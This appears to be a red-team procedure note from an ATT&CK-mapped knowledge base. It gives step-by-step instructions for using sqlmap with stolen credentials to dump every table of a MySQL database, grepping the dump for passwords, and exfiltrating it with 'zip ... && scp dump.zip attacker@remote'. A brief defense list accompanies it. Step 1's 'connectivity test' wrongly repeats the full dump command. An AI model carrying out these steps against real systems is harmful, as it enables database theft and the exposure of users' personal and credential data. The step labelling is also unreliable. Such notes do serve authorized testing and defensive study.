---
id: 8a5cb91e-9cfa-4f3e-b688-d6d432cec6d7
name: Dump-MySQL-Database-Using-SQLmap
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:36.531186+00:00'
updated_at: '2023-04-10T20:24:27.021211+00:00'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Data from Information Repositories|T1213 - Data from
    Information Repositories]]
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
sub_techniques: []
tags:
  - '[[tags/SQL Injection]]'
  - '[[tags/SQLmap]]'
  - '[[tags/Database-Dumping]]'
commands:
  - '[[commands/sqlmap-dump-all-mysql]]'
platforms:
  - Linux
tools:
  - '[[tools/sqlmap]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Dump-MySQL-Database-Using-SQLmap

## Summary

This procedure uses SQLmap to connect directly to a MySQL database using provided credentials and dump all tables and data. It is useful in scenarios where an attacker has obtained database credentials through prior reconnaissance or exploitation, allowing for the extraction of sensitive information such as user data, configurations, or financial records without needing an active SQL injection vulnerability in a web application.

## Description

SQLmap is an automated tool for detecting and exploiting SQL injection flaws, but it also supports direct database connections for dumping data when credentials are available. In this procedure, the tool connects to a MySQL instance using a connection string in the format 'mysql://user:pass@ip/database'. The --dump-all option extracts every table's structure and contents, saving them to CSV files for analysis. This approach targets backend databases in web environments, assuming the attacker has network access and valid credentials. It maps to MITRE ATT&CK by enabling data collection from information repositories after initial credential compromise. Prerequisites include knowing the database endpoint, authentication details, and having SQLmap installed on a Linux-based attack machine. Potential outcomes include full database compromise, leading to data exfiltration for further attacks like identity theft or lateral movement.

## Requirements

1. Valid MySQL database credentials (username and password) obtained via prior access, such as through SQL injection, phishing, or misconfiguration.
2. Network access to the MySQL server (e.g., port 3306 open or tunneled).
3. SQLmap tool installed on the attacker's machine (typically on Kali Linux or similar).
4. Knowledge of the target database name and IP address.
5. Sufficient disk space on the attacker's machine for dumped files.

## Defense

- Implement strong access controls on database servers, such as firewall rules limiting connections to trusted IPs and using VPNs for remote access.
- Enforce least-privilege principles for database users, avoiding accounts with dump permissions unless necessary.
- Enable database logging and monitoring for unusual queries or bulk data exports; integrate with SIEM for alerts on large data transfers.
- Use encryption for data at rest and in transit (e.g., TLS for MySQL connections) to protect against interception.
- Regularly rotate credentials and conduct vulnerability assessments to prevent initial credential theft.

## Objectives

1. Establish a direct connection to the target MySQL database using compromised credentials.
2. Enumerate and extract all tables and data from the database.
3. Save the dumped data in a structured format for offline analysis and exfiltration.
4. Verify the integrity of the extracted data to ensure completeness.

## Instructions

### Step 1: Verify SQLmap Installation and Database Connectivity

**Context**: Before dumping, confirm SQLmap is available and test basic connectivity to the MySQL server to avoid errors during the main operation. This step ensures prerequisites are met and identifies any network issues early.

**Command** ([[commands/sqlmap-dump-all-mysql]]):
```bash
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all --batch
```

> Use a simplified test first: Replace placeholders with actual values and run `mysql -u user -p -h ip` (using the password) to verify login. If successful, proceed. Expected output: MySQL prompt or connection success message. If connection fails, check firewall, credentials, or port forwarding.

### Step 2: Initiate the Full Database Dump

**Context**: Execute the core SQLmap command to connect and dump all data. The --batch flag automates responses to prompts, making it suitable for scripted or remote execution. This step performs the actual data extraction.

**Command** ([[commands/sqlmap-dump-all-mysql]]):
```bash
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all --batch
```

> Replace 'user', 'pass', 'ip', and 'database' with target specifics (e.g., user=root, pass=admin123, ip=192.168.1.100, database=webapp_db). SQLmap will enumerate tables, inject payloads if needed (though direct connect bypasses injection), and export data. Expected output: Progress logs showing table enumeration (e.g., "[INFO] fetching database names") and dump completion (e.g., "[INFO] table 'users' dumped to CSV file '/path/to/dump/users.csv'").

### Step 3: Locate and Verify Dumped Files

**Context**: After the dump completes, inspect the output directory for CSV files containing table data. This verifies success and allows initial triage of sensitive information.

**Instructions**: Navigate to the SQLmap output directory (default: ~/.sqlmap/output/). List files with `ls -la` and open samples (e.g., `cat dump.csv`) to check for expected columns like usernames or emails.

> Expected output: Multiple CSV files named after tables (e.g., users.csv with headers like id,username,password). Success criteria: Files contain data rows without errors; cross-check row counts against database schema if known.

### Step 4: Analyze and Exfiltrate Data

**Context**: Review dumped data for valuable intelligence and prepare for transfer. This step ensures the procedure's output is actionable.

**Instructions**: Use tools like `csvkit` or Excel to parse CSVs. Search for keywords (e.g., `grep -i password *.csv`). If needed, zip and exfiltrate: `zip -r dump.zip dump/ && scp dump.zip attacker@remote:/path/`.

> Expected output: Structured data revealing sensitive info (e.g., hashed passwords for cracking). If no data appears, revisit credentials or permissions.
